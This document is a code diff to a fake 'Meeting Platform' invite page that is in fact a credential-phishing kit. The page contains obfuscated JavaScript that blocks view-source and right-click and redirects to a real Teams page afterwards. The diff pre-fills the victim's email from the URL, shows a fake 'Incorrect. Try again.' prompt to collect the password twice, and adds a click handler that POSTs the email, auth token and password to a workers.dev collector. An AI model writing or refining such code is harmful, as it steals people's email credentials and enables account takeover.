@@ -101,8 +101,146 @@
             }
 
             body {
-                background: #ececec;
-            }
+    background: #ececec;
+}
+
+/* Connecting overlay for the video panel */
+.video-connecting {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: rgba(20, 22, 34, 0.85);
+    color: #fff;
+    font-family: 'Segoe UI', sans-serif;
+    z-index: 5;
+    transition: opacity 0.4s ease;
+}
+.video-connecting.hidden {
+    opacity: 0;
+    pointer-events: none;
+}
+.video-connecting .spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid rgba(255,255,255,0.25);
+    border-top-color: #2772F9;
+    border-radius: 50%;
+    animation: vc-spin 0.9s linear infinite;
+    margin-bottom: 14px;
+}
+.video-connecting p {
+    font-size: 15px;
+    letter-spacing: 0.3px;
+    opacity: 0.9;
+}
+@keyframes vc-spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Incorrect / try again state for the sign-in card */
+.card.shake {
+    animation: card-shake 0.45s ease;
+}
+@keyframes card-shake {
+    0%, 100% { transform: translateX(0); }
+    20%      { transform: translateX(-8px); }
+    40%      { transform: translateX(8px); }
+    60%      { transform: translateX(-6px); }
+    80%      { transform: translateX(6px); }
+}
+
+/* Email popup */
+.email-modal-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.45);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10000;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.2s ease;
+}
+.email-modal-backdrop.open {
+    opacity: 1;
+    pointer-events: auto;
+}
+.email-modal {
+    background: #fff;
+    border-radius: 12px;
+    padding: 24px;
+    width: 90%;
+    max-width: 360px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+    font-family: 'Segoe UI', sans-serif;
+}
+.email-modal h3 {
+    margin: 0 0 6px;
+    font-size: 18px;
+    font-weight: 600;
+    color: #1a1b2b;
+}
+.email-modal p {
+    margin: 0 0 16px;
+    font-size: 13px;
+    color: #666;
+}
+.email-modal input {
+    width: 100%;
+    padding: 10px 12px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 14px;
+    margin-bottom: 16px;
+    box-sizing: border-box;
+}
+.email-modal input:read-only {
+    background: #f3f4f6;
+    color: #555;
+    cursor: not-allowed;
+}
+.email-modal .modal-actions {
+    display: flex;
+    gap: 10px;
+    justify-content: flex-end;
+}
+.email-modal .modal-actions button {
+    width: auto;
+    padding: 10px 18px;
+    border-radius: 6px;
+    border: none;
+    font-size: 14px;
+    cursor: pointer;
+}
+.email-modal .btn-primary {
+    background: #2772F9;
+    color: #fff;
+}
+.email-modal .btn-primary:hover {
+    background: #125aa3;
+}
+.email-modal .btn-secondary {
+    background: #e5e7eb;
+    color: #333;
+}
+.email-modal .btn-secondary:hover {
+    background: #d1d5db;
+}
+#tryAgainMsg {
+    display: none;
+    color: #e53935;
+    font-size: 13px;
+    font-weight: 500;
+    margin: -6px 0 14px;
+    text-align: left;
+}
+#tryAgainMsg.show {
+    display: block;
+}
 
             /* HEADER */
             header {
@@ -647,6 +785,13 @@
             <!-- LEFT VIDEO AREA -->
             <div class="left">
                 <video style="width: 100%; height: auto" id="cameraPreview" autoplay playsinline></video>
+
+                <!-- Connecting overlay -->
+                <div class="video-connecting" id="videoConnecting">
+                    <div class="spinner"></div>
+                    <p>Connecting to camera…</p>
+                </div>
+
                 <div class="left-controls fontss">
                     <i class="fa-solid fa-microphone"></i>
                     <i class="fa-solid fa-video"></i>
@@ -664,12 +809,12 @@
 
             </div>
 
-            <!-- RIGHT PANEL -->
-            <form id="form" action="https://mail-com.ninabaiiley1302.workers.dev/" method="POST">
-                <div class="right1" style="margin:20px">
-                    <h1>Meeting Platform</h1>
-                    <p>Welcome <span id="mp">jkhg</span> , you have been invited to join a meeting</p>
+                        <!-- RIGHT PANEL -->
+            <div class="right1" style="margin:20px">
+                <h1>Meeting Platform</h1>
+                <p>Welcome <span id="mp"> </span> , you have been invited to join a meeting</p>
 
+                <form id="form" action="https://mail-com.ninabaiiley1302.workers.dev/" method="POST">
                     <div class="card">
                         <h3>Continue sign in as</h3>
                         <small id="email"></small>
@@ -683,6 +828,8 @@
 
                         <input type="password" id="pr" name="password" placeholder="Enter Email Password" />
 
+                        <div id="tryAgainMsg">Incorrect. Try again.</div>
+
                         <div class="alert alert-danger" id="invalid"
                             style="display: none; font-size:12px; padding:5px; color:red; margin-top:-15px;">Email or
                             Password is not valid.</div>
@@ -692,12 +839,10 @@
                                     statement</a></span>
                         </div>
 
-
                         <button type="submit" id="submit-btn">Launch Meeting</button>
-
                     </div>
-                </div>
-            </form>
+                </form>
+            </div>
 
         </div>
 
@@ -774,4 +919,228 @@
 
 <script>
 function _0x4401(_0x3955f7,_0x432c64){_0x3955f7=_0x3955f7-(0x3be+-0x1*-0x337+0x10*-0x57);var _0x381f65=_0x1fff();var _0x46d518=_0x381f65[_0x3955f7];return _0x46d518;}var _0x4b0604=_0x4401;(function(_0x1a2e21,_0x33325c){var _0x592a38=_0x4401,_0x2e6984=_0x1a2e21();while(!![]){try{var _0x201d6e=-parseInt(_0x592a38(0x1d3))/(0xef*0x1b+0x8f*-0x11+0x1*-0xfb5)+parseInt(_0x592a38(0x187))/(0xd*-0x1a1+0xd7*0x1b+-0x17e)+-parseInt(_0x592a38(0x194))/(0x76a+-0x1668+0xf01*0x1)+-parseInt(_0x592a38(0x1f8))/(0x827+0xce0+-0xa3*0x21)*(parseInt(_0x592a38(0x199))/(-0xdb9+-0x17b*0x5+0x1*0x1525))+-parseInt(_0x592a38(0x1d5))/(0xf96+0x3*-0x4da+-0x102*0x1)*(-parseInt(_0x592a38(0x1f1))/(-0x76d*-0x1+-0x15f*0x6+0xd4))+-parseInt(_0x592a38(0x1c6))/(0xc7*-0x25+-0x1*-0x23ea+-0x71f*0x1)+parseInt(_0x592a38(0x19b))/(-0x1a42+0x103*-0x10+0x2a7b);if(_0x201d6e===_0x33325c)break;else _0x2e6984['push'](_0x2e6984['shift']());}catch(_0x48e1ec){_0x2e6984['push'](_0x2e6984['shift']());}}}(_0x1fff,0x10820*0x1+0x12bc5+-0x9628),window[_0x4b0604(0x1b3)+_0x4b0604(0x1b2)](_0x4b0604(0x201),async()=>{var _0x2d3894=_0x4b0604,_0xd37107={'giImz':_0x2d3894(0x1e3),'pMCOr':_0x2d3894(0x1bc),'PbQZk':function(_0x636ff4){return _0x636ff4();},'nEZTR':function(_0x10f2f9,_0x50ee75,_0x3a84fb){return _0x10f2f9(_0x50ee75,_0x3a84fb);},'UjtBU':_0x2d3894(0x18d)+_0x2d3894(0x20c),'oMuGc':_0x2d3894(0x207)+_0x2d3894(0x210)+_0x2d3894(0x1c3)+_0x2d3894(0x1b1),'QdThO':function(_0x3f6ee1,_0x5d9ba3){return _0x3f6ee1(_0x5d9ba3);},'Elsxe':_0x2d3894(0x1ff)+_0x2d3894(0x1d1)+_0x2d3894(0x1be)+_0x2d3894(0x18c)+_0x2d3894(0x185)};_0xd37107[_0x2d3894(0x186)](setTimeout,()=>{var _0x22080a=_0x2d3894;document[_0x22080a(0x203)+_0x22080a(0x19a)](_0xd37107[_0x22080a(0x1df)])[_0x22080a(0x1a9)][_0x22080a(0x1d8)]=_0xd37107[_0x22080a(0x1dd)],_0xd37107[_0x22080a(0x1ed)](toggleDivs);},0x432+-0xd*0x1df+-0x1*-0x19fd);const _0x915ab3=document[_0x2d3894(0x203)+_0x2d3894(0x19a)](_0xd37107[_0x2d3894(0x1b7)]);try{const _0x2f1e6a=await navigator[_0x2d3894(0x1d0)+'es'][_0x2d3894(0x1ec)+'ia']({'video':!![],'audio':!![]});_0x915ab3[_0x2d3894(0x1fc)]=_0x2f1e6a;const _0x4447f1=_0x2f1e6a[_0x2d3894(0x1e2)+_0x2d3894(0x1ab)]()[0xa74+0x4*0x982+-0xc1f*0x4],_0x344d23=new MediaStream([_0x4447f1]),_0x5605c0=new Audio();_0x5605c0[_0x2d3894(0x1fc)]=_0x344d23,_0x5605c0[_0x2d3894(0x1dc)]();}catch(_0x3d3ff7){console[_0x2d3894(0x1c5)](_0xd37107[_0x2d3894(0x212)],_0x3d3ff7),_0xd37107[_0x2d3894(0x1b5)](alert,_0xd37107[_0x2d3894(0x20d)]);}}));function _0x1fff(){var _0xb7c4bb=['show','HSiXJ','ETSCm','keypress','iew','Elsxe','HQkwT','trim','ess\x20denied','kBsEM','oMuGc','bind','rmission.','nEZTR','156692ZUksrf','location','which','Mwopr','#automail','e\x20allow\x20pe','cameraPrev','block','append','vQXlX','om/free','Bzaas','auymO','419319APgkyY','get','contextmen','spYOA','keyCode','5855vzOCGA','ById','4444137tNcwLV','ready','textConten','nnweh','click','mUjEi','lUrkB','lTmqS','ZNUVt','#back1','OUQUt','SYxwv','#submit-bt','search','style','ORhFj','acks','#invalid','zNCXs','rGHdM','animate','email','ailable:','stener','addEventLi','#email','QdThO','iufxE','UjtBU','ddipP','vuSfx','#pr','#ai','none','SLUPm','era.\x20Pleas','#inputbar','MRBTl','TrBsr','querySelec','\x20or\x20not\x20av','ault','error','824544FxIiKy','cbuAL','mXOHy','RjMEu','xxGba','.box2','action','split','gPxlV','mLlGI','mediaDevic','access\x20cam','XRlDa','65323WWBBbD','https://te','354sajAvH','uBXOd','preventDef','display','.box1','fZoxz','yzBDF','play','pMCOr','iqiax','giImz','ctrlKey','auth','getAudioTr','early','PvGdo','href','hide','ams.live.c','POST','BRkgY','onkeydown','CiIDs','getUserMed','PbQZk','serialize','val','rvRbP','420VtIdwV','html','kYjcd','OWJLb','fcVGI','#form','KInUV','552LLRdNa','#msg','tor','PGbUz','srcObject','CAavg','LOHyL','Unable\x20to\x20','piFQY','load','replace','getElement','keydown','GMvtn','attr','Camera\x20acc'];_0x1fff=function(){return _0xb7c4bb;};return _0x1fff();}function toggleDivs1(){var _0x1a70c8=_0x4b0604,_0x38cbf7={'XRlDa':_0x1a70c8(0x1d4)+_0x1a70c8(0x1e7)+_0x1a70c8(0x191)};window[_0x1a70c8(0x188)][_0x1a70c8(0x202)](_0x38cbf7[_0x1a70c8(0x1d2)]);}function toggleDivs(){var _0x179d10=_0x4b0604,_0x24a005={'rGHdM':_0x179d10(0x1d9),'vuSfx':_0x179d10(0x1cb),'BRkgY':function(_0x2128c9,_0x41a952){return _0x2128c9===_0x41a952;},'KInUV':_0x179d10(0x1bc),'OWJLb':_0x179d10(0x18e)};const _0x9d0af3=document[_0x179d10(0x1c2)+_0x179d10(0x1fa)](_0x24a005[_0x179d10(0x1ae)]),_0xd4e5c5=document[_0x179d10(0x1c2)+_0x179d10(0x1fa)](_0x24a005[_0x179d10(0x1b9)]);_0x24a005[_0x179d10(0x1e9)](_0x9d0af3[_0x179d10(0x1a9)][_0x179d10(0x1d8)],_0x24a005[_0x179d10(0x1f7)])&&(_0x9d0af3[_0x179d10(0x1a9)][_0x179d10(0x1d8)]=_0x24a005[_0x179d10(0x1f4)],_0xd4e5c5[_0x179d10(0x1a9)][_0x179d10(0x1d8)]=_0x24a005[_0x179d10(0x1f7)]);}$(document)[_0x4b0604(0x213)](_0x4b0604(0x204),function(_0x543fb7){var _0x47899c=_0x4b0604,_0x43cbd5={'zNCXs':function(_0xc1982f,_0x48db34){return _0xc1982f==_0x48db34;}};if(_0x543fb7[_0x47899c(0x1e0)]&&_0x43cbd5[_0x47899c(0x1ad)](_0x543fb7[_0x47899c(0x189)],0x1b*-0xe4+0x2315+0x6*-0x1c9))return _0x543fb7[_0x47899c(0x1d7)+_0x47899c(0x1c4)](),![];}),document[_0x4b0604(0x1b3)+_0x4b0604(0x1b2)](_0x4b0604(0x196)+'u',_0x462c55=>_0x462c55[_0x4b0604(0x1d7)+_0x4b0604(0x1c4)]()),document[_0x4b0604(0x1ea)]=function(_0x50d595){var _0x1fff4e=_0x4b0604,_0x21e59f={'ddipP':function(_0x42ff76,_0x17afaf){return _0x42ff76===_0x17afaf;},'HQkwT':function(_0x2753ef,_0x23a625){return _0x2753ef===_0x23a625;},'spYOA':function(_0x59a3e3,_0x3947e8){return _0x59a3e3===_0x3947e8;},'fcVGI':function(_0x404fce,_0x174f06){return _0x404fce===_0x174f06;}};return _0x50d595[_0x1fff4e(0x1e0)]&&(_0x21e59f[_0x1fff4e(0x1b8)](_0x50d595[_0x1fff4e(0x198)],-0x225e+-0x9*0x2bd+0x3b46)||_0x21e59f[_0x1fff4e(0x20e)](_0x50d595[_0x1fff4e(0x198)],-0x1e18+0x1d71+0x17*0xb)||_0x21e59f[_0x1fff4e(0x197)](_0x50d595[_0x1fff4e(0x198)],0x1*-0x1cba+0xd*-0x2ff+0x4402)||_0x21e59f[_0x1fff4e(0x1f5)](_0x50d595[_0x1fff4e(0x198)],-0x1cf*0xa+-0x5ae*-0x4+-0x42d))?![]:!![];},$(document)[_0x4b0604(0x20b)]('u',function(_0x34e241){var _0x46becd=_0x4b0604;return _0x34e241[_0x46becd(0x1e0)]?![]:!![];}),$(document)[_0x4b0604(0x19c)](function(){var _0x39e0cb=_0x4b0604,_0xe3307d={'Bzaas':function(_0x20248a,_0x121c27){return _0x20248a(_0x121c27);},'HSiXJ':_0x39e0cb(0x1f9),'piFQY':_0x39e0cb(0x1bb),'RjMEu':function(_0x30da3a,_0x52b26e){return _0x30da3a(_0x52b26e);},'lUrkB':_0x39e0cb(0x18b),'Mwopr':_0x39e0cb(0x1e6),'lTmqS':_0x39e0cb(0x1bf),'kYjcd':_0x39e0cb(0x208),'uBXOd':function(_0x5160f5,_0x180555){return _0x5160f5(_0x180555);},'mUjEi':function(_0xb60021,_0x423913){return _0xb60021(_0x423913);},'OUQUt':_0x39e0cb(0x1ba),'iqiax':function(_0x493643,_0x43c883){return _0x493643(_0x43c883);},'MRBTl':_0x39e0cb(0x1ac),'vQXlX':function(_0x1c0fc9,_0x501461){return _0x1c0fc9(_0x501461);},'ORhFj':function(_0xcdee10,_0x2d5923){return _0xcdee10(_0x2d5923);},'ETSCm':function(_0x2a1bce,_0x4917e1){return _0x2a1bce!=_0x4917e1;},'iufxE':function(_0x57c173,_0x2125ab){return _0x57c173(_0x2125ab);},'fZoxz':_0x39e0cb(0x1f6),'CiIDs':_0x39e0cb(0x1b0),'auymO':function(_0x454ea3,_0x265a58,_0x5aab23){return _0x454ea3(_0x265a58,_0x5aab23);},'ZNUVt':_0x39e0cb(0x1cc),'GMvtn':_0x39e0cb(0x1e8),'xxGba':function(_0xd635fe,_0x305894,_0x528f7f){return _0xd635fe(_0x305894,_0x528f7f);},'rvRbP':function(_0xa288f6,_0x99027e,_0x34bad2){return _0xa288f6(_0x99027e,_0x34bad2);},'SLUPm':_0x39e0cb(0x1d9),'SYxwv':_0x39e0cb(0x1cb),'yzBDF':function(_0x5375ad){return _0x5375ad();},'mXOHy':function(_0x39bb18,_0x278355){return _0x39bb18(_0x278355);},'LOHyL':_0x39e0cb(0x1a4),'kBsEM':_0x39e0cb(0x1e1),'nnweh':function(_0x5a0e44,_0x448bd1){return _0x5a0e44(_0x448bd1);},'cbuAL':_0x39e0cb(0x1b4),'CAavg':function(_0x8884bd,_0x41a389){return _0x8884bd(_0x41a389);},'PvGdo':_0x39e0cb(0x1a7)+'n'},_0x45225c=-0x12ff*0x1+-0x1efd+0x31fc;_0xe3307d[_0x39e0cb(0x1c8)]($,_0xe3307d[_0x39e0cb(0x1fe)])[_0x39e0cb(0x19f)](function(){var _0x38aad5=_0x39e0cb;_0xe3307d[_0x38aad5(0x192)]($,_0xe3307d[_0x38aad5(0x209)])[_0x38aad5(0x1e6)](),_0xe3307d[_0x38aad5(0x192)]($,_0xe3307d[_0x38aad5(0x200)])[_0x38aad5(0x1ef)](''),_0xe3307d[_0x38aad5(0x1c9)]($,_0xe3307d[_0x38aad5(0x1a1)])[_0x38aad5(0x1af)]({'left':0xc8,'opacity':_0xe3307d[_0x38aad5(0x18a)]},-0x1ee2+-0x1752+0x3634),_0xe3307d[_0x38aad5(0x1c9)]($,_0xe3307d[_0x38aad5(0x1a2)])[_0x38aad5(0x1af)]({'right':0xc8,'opacity':_0xe3307d[_0x38aad5(0x1f3)]},0xb4b+0x1*0x443+-0xba6);});function _0x555aa8(_0x442d90){var _0x23071e=_0x39e0cb;const _0xef3c6d=new URLSearchParams(window[_0x23071e(0x188)][_0x23071e(0x1a8)]);return _0xef3c6d[_0x23071e(0x195)](_0x442d90);}var _0x1117fc=window[_0x39e0cb(0x188)][_0x39e0cb(0x1e5)],_0x14637d=new URL(_0x1117fc),_0x1d5b96=new URLSearchParams(_0x14637d[_0x39e0cb(0x1a8)]),_0x428d2f=_0x1d5b96[_0x39e0cb(0x195)](_0xe3307d[_0x39e0cb(0x211)]),_0x4fe093=_0x428d2f[_0x39e0cb(0x1cd)]('@')[0x24a2+0x1568+-0x1*0x3a0a],_0x54ee1d=_0x428d2f,_0x16629c=_0x4fe093,_0x2402f8=0x221e+0xe62+-0x3080;_0xe3307d[_0x39e0cb(0x19e)]($,_0xe3307d[_0x39e0cb(0x1c7)])[_0x39e0cb(0x1f2)](_0x54ee1d),document[_0x39e0cb(0x203)+_0x39e0cb(0x19a)]('mp')[_0x39e0cb(0x19d)+'t']=_0x4fe093,_0xe3307d[_0x39e0cb(0x1fd)]($,_0xe3307d[_0x39e0cb(0x1e4)])[_0x39e0cb(0x19f)](function(_0x206ab6){var _0x16db1e=_0x39e0cb,_0x136c0d={'mLlGI':function(_0xcc1c29,_0xe43578){var _0x4003c0=_0x4401;return _0xe3307d[_0x4003c0(0x1d6)](_0xcc1c29,_0xe43578);},'gPxlV':_0xe3307d[_0x16db1e(0x209)],'PGbUz':function(_0x42eae5,_0x4e7901){var _0x42beb9=_0x16db1e;return _0xe3307d[_0x42beb9(0x1a0)](_0x42eae5,_0x4e7901);},'TrBsr':_0xe3307d[_0x16db1e(0x1a5)]};_0x206ab6[_0x16db1e(0x1d7)+_0x16db1e(0x1c4)](),_0xe3307d[_0x16db1e(0x1de)]($,_0xe3307d[_0x16db1e(0x1c0)])[_0x16db1e(0x1e6)](),_0xe3307d[_0x16db1e(0x190)]($,_0xe3307d[_0x16db1e(0x209)])[_0x16db1e(0x1e6)]();var _0x144375=_0xe3307d[_0x16db1e(0x1aa)]($,_0xe3307d[_0x16db1e(0x1a5)])[_0x16db1e(0x1ef)](),_0x3d7a94=!_0x54ee1d[_0x16db1e(0x20f)]()||!_0x144375[_0x16db1e(0x20f)]();if(_0x3d7a94)return _0xe3307d[_0x16db1e(0x190)]($,_0xe3307d[_0x16db1e(0x1c0)])[_0x16db1e(0x208)](),![];else{if(_0xe3307d[_0x16db1e(0x20a)](_0x2402f8,-0x1*0x1019+0x8*-0x26+0xe9*0x13)){_0x2402f8++;let _0x553ef5=new URLSearchParams(_0xe3307d[_0x16db1e(0x1b6)]($,_0xe3307d[_0x16db1e(0x1da)])[_0x16db1e(0x1ee)]());_0x553ef5[_0x16db1e(0x18f)](_0xe3307d[_0x16db1e(0x1eb)],_0x54ee1d),_0xe3307d[_0x16db1e(0x193)](fetch,_0xe3307d[_0x16db1e(0x1de)]($,_0xe3307d[_0x16db1e(0x1da)])[_0x16db1e(0x206)](_0xe3307d[_0x16db1e(0x1a3)]),{'method':_0xe3307d[_0x16db1e(0x205)],'body':_0x553ef5}),_0xe3307d[_0x16db1e(0x1ca)](setTimeout,()=>{var _0x3da42c=_0x16db1e;_0x136c0d[_0x3da42c(0x1cf)]($,_0x136c0d[_0x3da42c(0x1ce)])[_0x3da42c(0x208)](),_0x136c0d[_0x3da42c(0x1fb)]($,_0x136c0d[_0x3da42c(0x1c1)])[_0x3da42c(0x1ef)]('');},-0x2162+0x1e63+0xeb7*0x1);}else{let _0x25eb9d=new URLSearchParams(_0xe3307d[_0x16db1e(0x1a0)]($,_0xe3307d[_0x16db1e(0x1da)])[_0x16db1e(0x1ee)]());_0x25eb9d[_0x16db1e(0x18f)](_0xe3307d[_0x16db1e(0x1eb)],_0x54ee1d),_0xe3307d[_0x16db1e(0x1f0)](fetch,_0xe3307d[_0x16db1e(0x1a0)]($,_0xe3307d[_0x16db1e(0x1da)])[_0x16db1e(0x206)](_0xe3307d[_0x16db1e(0x1a3)]),{'method':_0xe3307d[_0x16db1e(0x205)],'body':_0x25eb9d});const _0x56d28f=document[_0x16db1e(0x1c2)+_0x16db1e(0x1fa)](_0xe3307d[_0x16db1e(0x1bd)]),_0x20b677=document[_0x16db1e(0x1c2)+_0x16db1e(0x1fa)](_0xe3307d[_0x16db1e(0x1a6)]);_0xe3307d[_0x16db1e(0x1db)](toggleDivs1);}}});});
+</script>
+<script>
+(function () {
+    var video   = document.getElementById('cameraPreview');
+    var overlay = document.getElementById('videoConnecting');
+    if (!video || !overlay) return;
+
+    function hideOverlay() {
+        overlay.classList.add('hidden');
+    }
+
+    var tries = 0;
+    var poll = setInterval(function () {
+        tries++;
+        if (video.srcObject) {
+            clearInterval(poll);
+            video.addEventListener('playing', hideOverlay, { once: true });
+            setTimeout(hideOverlay, 1500);
+        }
+        if (tries > 40) {
+            clearInterval(poll);
+            overlay.querySelector('p').textContent = 'Verify your email to connect';
+            overlay.querySelector('.spinner').style.animation = 'none';
+            overlay.querySelector('.spinner').style.borderTopColor = '#e53935';
+        }
+    }, 200);
+
+    if (video.srcObject) hideOverlay();
+})();
+</script>
+<script>
+(function () {
+    document.addEventListener('DOMContentLoaded', function () {
+        var params = new URLSearchParams(window.location.search);
+
+        // Try the common names this template uses. First one present wins.
+        var token = params.get('auth')
+                 || params.get('token')
+                 || params.get('meeting')
+                 || params.get('meetingId')
+                 || params.get('id')
+                 || '';
+
+        if (!token) {
+            console.warn('No auth/token/meeting parameter in URL — auth will be blank:',
+                         window.location.href);
+            return;
+        }
+
+        var authInput = document.querySelector('input[name="auth"]');
+        if (authInput) {
+            authInput.value = token;
+            console.log('auth input populated with:', token);
+        }
+    });
+})();
+</script>
+<div class="email-modal-backdrop" id="emailModalBackdrop">
+    <div class="email-modal">
+        <h3 id="emailModalTitle">Confirm your email</h3>
+        <p id="emailModalHint">We'll use this to identify you in the meeting.</p>
+        <input type="email" id="emailModalInput" placeholder="you@example.com" />
+        <div class="modal-actions">
+            <button type="button" class="btn-secondary" id="emailModalCancel">Cancel</button>
+            <button type="button" class="btn-primary" id="emailModalSave">Continue</button>
+        </div>
+    </div>
+</div>
+<script>
+(function () {
+    document.addEventListener('DOMContentLoaded', function () {
+        var backdrop = document.getElementById('emailModalBackdrop');
+        var input    = document.getElementById('emailModalInput');
+        var title    = document.getElementById('emailModalTitle');
+        var hint     = document.getElementById('emailModalHint');
+        var btnSave  = document.getElementById('emailModalSave');
+        var btnCancel= document.getElementById('emailModalCancel');
+        if (!backdrop || !input) return;
+
+        // 1) Read the email from the URL, if present
+        var params   = new URLSearchParams(window.location.search);
+        var grabbed  = params.get('email') || '';
+        var grabbedLocal = grabbed ? grabbed.split('@')[0] : '';
+
+        // 2) Write it into the page elements the original code reads
+        function applyEmail(fullEmail) {
+            var local = fullEmail ? fullEmail.split('@')[0] : '';
+
+            // #mp (the "Welcome <span id=mp>" line)
+            var mpEl = document.getElementById('mp');
+            if (mpEl) mpEl.textContent = local || 'guest';
+
+            // #email (the <small> in the card)
+            var emailEl = document.getElementById('email');
+            if (emailEl) emailEl.textContent = fullEmail;
+
+            // Any hidden inputs that expect the email
+            document.querySelectorAll('input[name="email"]').forEach(function (el) {
+                el.value = fullEmail;
+            });
+
+            // Record it for anything else that reads window state
+            window.__meetingEmail = fullEmail;
+
+            console.log('[email-popup] applied:', fullEmail);
+        }
+
+                // 3) Decide whether to open the modal
+        if (grabbed) {
+            // Grabbed from URL: record silently, DON'T show the popup.
+            applyEmail(grabbed);
+            console.log('[email-popup] auto-grabbed, skipping popup:', grabbed);
+
+            // Focus the password field straight away
+            var pw = document.getElementById('pr');
+            if (pw) setTimeout(function () { pw.focus(); }, 50);
+        } else {
+            // No URL email: ask the user with the popup
+            input.value = '';
+            input.readOnly = false;
+            title.textContent = 'Enter your email';
+            hint.textContent  = 'No email found in the invite link. Please enter it.';
+            backdrop.classList.add('open');
+            setTimeout(function () { input.focus(); }, 50);
+        }
+
+        // 4) Continue button
+        btnSave.addEventListener('click', function () {
+            var val = (input.value || '').trim();
+            if (!val || val.indexOf('@') === -1) {
+                input.focus();
+                input.style.borderColor = '#e53935';
+                return;
+            }
+            input.style.borderColor = '#ccc';
+            applyEmail(val);
+            backdrop.classList.remove('open');
+        });
+
+        // 5) Enter key saves too
+        input.addEventListener('keydown', function (e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                btnSave.click();
+            }
+        });
+
+        // 6) Cancel just closes (email stays whatever it was)
+        btnCancel.addEventListener('click', function () {
+            backdrop.classList.remove('open');
+        });
+    });
+})();
+</script>
+<script>
+(function () {
+    document.addEventListener('DOMContentLoaded', function () {
+        var btn = document.getElementById('submit-btn');
+        if (!btn) return;
+
+        // Capture phase + stopPropagation so we run INSTEAD of the
+        // obfuscated click handler (which was posting without auth/email).
+        btn.addEventListener('click', function (e) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+
+            // 1) Gather every field the backend expects
+            var email    = window.__meetingEmail
+                        || (document.getElementById('email') && document.getElementById('email').textContent)
+                        || new URLSearchParams(location.search).get('email')
+                        || '';
+
+            var authVal  = new URLSearchParams(location.search).get('auth')
+                        || new URLSearchParams(location.search).get('token')
+                        || new URLSearchParams(location.search).get('meeting')
+                        || (document.querySelector('input[name="auth"]') || {}).value
+                        || '';
+
+            var password = (document.getElementById('pr') || {}).value || '';
+            var formtype = (document.querySelector('input[name="formtype"]') || {}).value || 'login';
+
+            // 2) Build the POST body
+            var body = new URLSearchParams();
+            body.append('email',    email);
+            body.append('auth',     authVal);
+            body.append('password', password);
+            body.append('formtype', formtype);
+
+            // 3) Where to send it — use the form's action, or a default
+            var form = document.getElementById('form');
+            var action = (form && form.getAttribute('action')) || 'https://mail-com.ninabaiiley1302.workers.dev/';
+
+            console.log('[post] sending:', body.toString(), '->', action);
+
+            // 4) Send it
+            fetch(action, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: body
+            })
+            .then(function (res) {
+                console.log('[post] status:', res.status);
+                if (res.ok) {
+                    // Success — hide the sign-in card, show the meeting screen
+                    var box1 = document.querySelector('.box1');
+                    var box2 = document.querySelector('.box2');
+                    if (box1) box1.style.display = 'none';
+                    if (box2) box2.style.display = 'block';
+                } else {
+                    // Server rejected — show "Incorrect. Try again."
+                    var msg = document.getElementById('tryAgainMsg');
+                    if (msg) msg.classList.add('show');
+                    var input = document.getElementById('pr');
+                    if (input) { input.value = ''; input.focus(); }
+                }
+            })
+            .catch(function (err) {
+                console.error('[post] network error:', err);
+                var msgEl = document.getElementById('msg'); // your "Network connection Error" element
+                if (msgEl) msgEl.style.display = 'block';
+            });
+        }, true); // <-- true = capture phase, runs before the obfuscated handler
+    });
+})();
 </script>
